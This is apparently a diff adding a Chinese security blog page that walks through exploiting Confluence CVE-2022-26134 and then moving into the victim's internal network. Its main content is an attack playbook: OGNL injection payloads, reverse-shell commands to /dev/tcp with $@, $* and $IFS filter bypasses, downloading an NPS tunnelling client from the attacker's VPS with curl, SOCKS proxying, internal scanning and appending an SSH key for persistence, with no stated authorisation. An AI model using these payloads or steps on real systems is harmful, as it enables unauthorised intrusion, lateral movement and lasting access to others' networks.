@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="起因：Nuclei爆红，Atlassian Confluence的命令执行漏洞，编号：CVE-2022-26134 1.思路1命令执行-反弹shell失败-反弹shell成功-代理nps落地-内网之旅  2.命令执行Nuclei已经给出了攻击载荷，而且把RCE之后的结果输出了  payload解码看一下： 1$&amp;#123;(#a&#x3D;@org.apache.commons.io.IOUtils@toS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次RCE-内网之旅">
+<meta property="og:url" content="https://huclilu.github.io/posts/cf29e875/index.html">
+<meta property="og:site_name" content="Ace|安全之道、就在其中">
+<meta property="og:description" content="起因：Nuclei爆红，Atlassian Confluence的命令执行漏洞，编号：CVE-2022-26134 1.思路1命令执行-反弹shell失败-反弹shell成功-代理nps落地-内网之旅  2.命令执行Nuclei已经给出了攻击载荷，而且把RCE之后的结果输出了  payload解码看一下： 1$&amp;#123;(#a&#x3D;@org.apache.commons.io.IOUtils@toS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310091803512.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310095706611.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310101132000.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310101408165.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310135302296.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310135426202.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145440253.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145348745.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145740262.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145804161.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310151513558.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310151432322.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310152607184.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310152829399.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154306616.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154357664.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154450133.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154625134.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154728387.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154757423.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154847367.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310161228500.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310161650860.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310161933762.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310162115513.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310162409706.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310162623531.png">
+<meta property="article:published_time" content="2023-03-09T11:55:16.000Z">
+<meta property="article:modified_time" content="2023-03-10T08:54:07.617Z">
+<meta property="article:author" content="老A">
+<meta property="article:tag" content="漏洞挖掘">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310091803512.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>记一次RCE-内网之旅</title>
+    
+    
+    <!-- styles -->
+
+    <!-- 默认CSS引入方法 -->
+    
+<link rel="stylesheet" href="/css/whiteStyle.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+
+  
+  <!-- L2Dwidget -->
+  
+<script src="/lib/live2d/L2Dwidget.min.js"></script>
+
+
+  <script>
+  // 猫
+  L2Dwidget.init({
+    model: {
+      jsonPath: "/lib/live2d/tororo/assets/tororo.model.json",
+    },
+    display: {
+      superSample: 2,
+      width: 60,
+      height: 80,
+      position: 'right',
+      hOffset: 0,
+      vOffset: 20,
+    },
+    mobile: {
+      show: true,
+      scale: 1,
+      motion: true,
+    },
+    react: {
+      opacityDefault: 1,
+      opacityOnHover: 1,
+    }
+  })
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 lte">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"
+    style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        
+          <li><a href="/">
+              首页
+            </a></li>
+          
+          <li><a href="/about/">
+              关于
+            </a></li>
+          
+          <li><a href="/archives/">
+              归档
+            </a></li>
+          
+          <li><a href="/search/">
+              搜索
+            </a></li>
+          
+      </ul>
+    </span>
+    <br />
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">1.思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">2.命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">3.反弹shell（失败）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">4.反弹shell（成功）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-bypass"><span class="toc-number">4.1.</span> <span class="toc-text">1.$@bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-bypass"><span class="toc-number">4.2.</span> <span class="toc-text">2.$*bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-IFSbypass"><span class="toc-number">4.3.</span> <span class="toc-text">3.$IFSbypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%BB%A3%E7%90%86NPS%E8%90%BD%E5%9C%B0"><span class="toc-number">5.</span> <span class="toc-text">5.代理NPS落地</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%86%85%E7%BD%91"><span class="toc-number">6.</span> <span class="toc-text">6.内网</span></a></li></ol>
+    </div>
+    <br />
+    <span id="actions">
+      <ul>
+        
+            
+              <li><a class="icon" aria-label="下一篇 " href="/posts/917134f1/"><i
+                    class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();"
+                    onmouseout="$('#i-next').toggle();"></i></a></li>
+              
+                <li><a class="icon" aria-label="返回顶部 " href="#"
+                    onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up"
+                      aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a>
+                </li>
+                <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt"
+                      aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();"
+                      onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">
+        上一篇
+      </span>
+      <span id="i-next" class="info" style="display:none;">
+        下一篇
+      </span>
+      <span id="i-top" class="info" style="display:none;">
+        返回顶部
+      </span>
+      <span id="i-share" class="info" style="display:none;">
+        分享文章
+      </span>
+    </span>
+    <br />
+    <div id="share" style="display: none">
+      <ul>
+  <li> 开发中. </li>
+  <!-- <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://huclilu.github.io/posts/cf29e875/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://huclilu.github.io/posts/cf29e875/&text=记一次RCE-内网之旅"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://huclilu.github.io/posts/cf29e875/&is_video=false&description=记一次RCE-内网之旅"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次RCE-内网之旅&body=Check out this article: https://huclilu.github.io/posts/cf29e875/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://huclilu.github.io/posts/cf29e875/&name=记一次RCE-内网之旅&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://huclilu.github.io/posts/cf29e875/&t=记一次RCE-内网之旅"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li> -->
+
+</ul>
+
+    </div>
+
+  </span>
+</div>
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        记一次RCE-内网之旅
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">老A</span>
+      </span>
+      <!-- 文章时间和首页时间 -->
+
+    <div class="postdate">
+      
+        <time datetime="2023-03-09T11:55:16.000Z" itemprop="datePublished">2023-03-09</time>
+        
+        (Updated: <time datetime="2023-03-10T08:54:07.617Z" itemprop="dateModified">2023-03-10</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content conterDiy" itemprop="articleBody">
+    <p>起因：Nuclei爆红，Atlassian Confluence的命令执行漏洞，编号：CVE-2022-26134<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310091803512.png" alt="image-20230310091803512"></p>
+<h2 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令执行-反弹shell失败-反弹shell成功-代理nps落地-内网之旅</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h2><p>Nuclei已经给出了攻击载荷，而且把RCE之后的结果输出了</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310095706611.png" alt="image-20230310095706611"></p>
+<p>payload解码看一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#a=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;utf-8&quot;)</span>).(<span class="meta">@com</span>.opensymphony.webwork.ServletActionContext<span class="meta">@getResponse()</span>.setHeader(<span class="string">&quot;X-Cmd-Response&quot;</span>,#a))&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload里，java.lang.Runtime类调用exec方法，执行whoami命令，在自定义的X-Cmd-Response响应头中输出命令执行的结果：</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310101132000.png" alt="image-20230310101132000"></p>
+<p>自定义响应头，尝试执行其它命令：</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310101408165.png" alt="image-20230310101408165"></p>
+<h2 id="3-反弹shell（失败）"><a href="#3-反弹shell（失败）" class="headerlink" title="3.反弹shell（失败）"></a>3.反弹shell（失败）</h2><p>网上有不少反弹shell的攻击载荷</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/$&#123;<span class="keyword">new</span> <span class="title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;new java.lang.ProcessBuilder().command(&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;).start()&quot;</span>)&#125;/</span><br></pre></td></tr></table></figure>
+
+<p>用网上公开的攻击载荷尝试反弹shell，发现nc监听一直没反应……</p>
+<p>尝试寻找Confluence的其它版本反弹shell</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310135302296.png" alt="image-20230310135302296"></p>
+<p>成功反弹</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310135426202.png" alt="image-20230310135426202"></p>
+<p>怀疑是版本的问题导致无法反弹shell，可老表告诉我说是特殊字符的问题，于是找了一下java下命令执行的一些细节</p>
+<p>java执行系统命令的代码：</p>
+<ol>
+<li><p>Runtime.getRuntime().exec()</p>
+</li>
+<li><p>new ProcessBuilder().start()</p>
+</li>
+</ol>
+<p>第二种执行系统命令的实现代码已经尝试过了，换第一种Runtime反弹shell，也就是Nuclei已经给出的攻击载荷</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#a=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;utf-8&quot;)</span>).(<span class="meta">@com</span>.opensymphony.webwork.ServletActionContext<span class="meta">@getResponse()</span>.setHeader(<span class="string">&quot;X-Cmd-Response&quot;</span>,#a))&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里需要注意的是，在使用Runtime执行命令的时候，会限制传入的参数，只能传入一个List对象或者数组，否则会导致命令执行不成功，反弹shell自然也会失败。</p>
+<h2 id="4-反弹shell（成功）"><a href="#4-反弹shell（成功）" class="headerlink" title="4.反弹shell（成功）"></a>4.反弹shell（成功）</h2><p>此时可以bypass让命令成功执行</p>
+<h3 id="1-bypass"><a href="#1-bypass" class="headerlink" title="1.$@bypass"></a>1.$@bypass</h3><p>$@能够获取对应的变量，比如：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c  <span class="string">&#x27;$@|bash&#x27;</span> xx <span class="built_in">echo</span> <span class="built_in">id</span></span><br></pre></td></tr></table></figure></p>
+<p>  这种方法可以成功执行id命令，$@获取 echo id然后通过管道符执行命令id，使用这种方式尝试反弹目标shell</p>
+<p>攻击载荷：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c $@|bash 0 echo 命令</span><br></pre></td></tr></table></figure>
+
+<p>于是$@bypass反弹shell的攻击载荷如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#a=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/6666 0&gt;&amp;1&#x27;).getInputStream(),&quot;utf-8&quot;)</span>).(<span class="meta">@com</span>.opensymphony.webwork.ServletActionContext<span class="meta">@getResponse()</span>.setHeader(<span class="string">&quot;X-Cmd-Response&quot;</span>,#a))&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试反弹shell：</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145440253.png" alt="image-20230310145440253"></p>
+<p>反弹shell成功</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145348745.png" alt="image-20230310145348745"></p>
+<h3 id="2-bypass"><a href="#2-bypass" class="headerlink" title="2.$*bypass"></a>2.$*bypass</h3><p>与上边同理</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145740262.png" alt="image-20230310145740262"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145804161.png" alt="image-20230310145804161"></p>
+<h3 id="3-IFSbypass"><a href="#3-IFSbypass" class="headerlink" title="3.$IFSbypass"></a>3.$IFSbypass</h3><p>反弹shell命令的空格在bash中可以用$IFS替代</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c bash -i &gt;&amp;/dev/tcp/ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>使用$IFS替代空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c bash$IFS-i$IFS&gt;&amp;/dev/tcp/ip/8888$IFS0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>尝试进行shell反弹</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310151513558.png" alt="image-20230310151513558"></p>
+<p>成功反弹shell</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310151432322.png" alt="image-20230310151432322"></p>
+<h2 id="5-代理NPS落地"><a href="#5-代理NPS落地" class="headerlink" title="5.代理NPS落地"></a>5.代理NPS落地</h2><p>shell成功反弹，就要考虑进内网扫描一波了，一是上传扫描工具直接扫描，二是将流量代理出来，本地扫描一波</p>
+<p>代理工具很多，各有优缺点，使用NPS进行内网穿透，NPC不需要配置，只需要文件落地即可</p>
+<p>个人VPS有NPC端，目标主机有curl命令</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310152607184.png" alt="image-20230310152607184"></p>
+<p>此时个人VPS开启python服务，目标主机用curl -O命令下载并保存npc端到本地</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310152829399.png" alt="image-20230310152829399"></p>
+<p>开启python服务 +] python3版本： python3 -m http.server 8888</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154306616.png" alt="image-20230310154306616"></p>
+<p>目标主机进行下载：curl -O <a target="_blank" rel="noopener" href="http://xxxx:8888/file">http://xxxx:8888/file</a></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154357664.png" alt="image-20230310154357664"></p>
+<p>解压并运行，服务端提前配置好</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154450133.png" alt="image-20230310154450133"></p>
+<p>运行.&#x2F;npc</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154625134.png" alt="image-20230310154625134"></p>
+<h2 id="6-内网"><a href="#6-内网" class="headerlink" title="6.内网"></a>6.内网</h2><p>可以看到客户端已经”上线”</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154728387.png" alt="image-20230310154728387"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154757423.png" alt="image-20230310154757423"></p>
+<p>Proxifier进行socks5代理即可</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154847367.png" alt="image-20230310154847367"></p>
+<p>配置firefox代理进入内网、k&#x2F;fscan扫起来：</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310161228500.png" alt="image-20230310161228500"></p>
+<p>再尝试echo &gt;&gt;追加进去公钥</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310161650860.png" alt="image-20230310161650860"></p>
+<p>X-shell配置好之后</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310161933762.png" alt="image-20230310161933762"></p>
+<p>追加公钥成功</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310162115513.png" alt="image-20230310162115513"></p>
+<p>本地设置好socks5代理</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310162409706.png" alt="image-20230310162409706"></p>
+<p>成功代理登陆：</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310162623531.png" alt="image-20230310162623531"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">钟声敲响了日落</span><br><span class="line">柏油路跃过山坡</span><br><span class="line">一直通向北方的 使我们想象</span><br><span class="line">长大后也未曾经过……</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" class="Popup" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer"  class="Popup" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">1.思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">2.命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">3.反弹shell（失败）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">4.反弹shell（成功）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-bypass"><span class="toc-number">4.1.</span> <span class="toc-text">1.$@bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-bypass"><span class="toc-number">4.2.</span> <span class="toc-text">2.$*bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-IFSbypass"><span class="toc-number">4.3.</span> <span class="toc-text">3.$IFSbypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%BB%A3%E7%90%86NPS%E8%90%BD%E5%9C%B0"><span class="toc-number">5.</span> <span class="toc-text">5.代理NPS落地</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%86%85%E7%BD%91"><span class="toc-number">6.</span> <span class="toc-text">6.内网</span></a></li></ol>
+    </div>
+
+    <div id="share-footer"  class="Popup" style="display: none">
+      <ul>
+  <li> 开发中. </li>
+  <!-- <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://huclilu.github.io/posts/cf29e875/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://huclilu.github.io/posts/cf29e875/&text=记一次RCE-内网之旅"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://huclilu.github.io/posts/cf29e875/&is_video=false&description=记一次RCE-内网之旅"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次RCE-内网之旅&body=Check out this article: https://huclilu.github.io/posts/cf29e875/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://huclilu.github.io/posts/cf29e875/&title=记一次RCE-内网之旅"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://huclilu.github.io/posts/cf29e875/&name=记一次RCE-内网之旅&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://huclilu.github.io/posts/cf29e875/&t=记一次RCE-内网之旅"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li> -->
+
+</ul>
+
+    </div>
+
+   
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2023
+    老A
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+ 
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+   
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
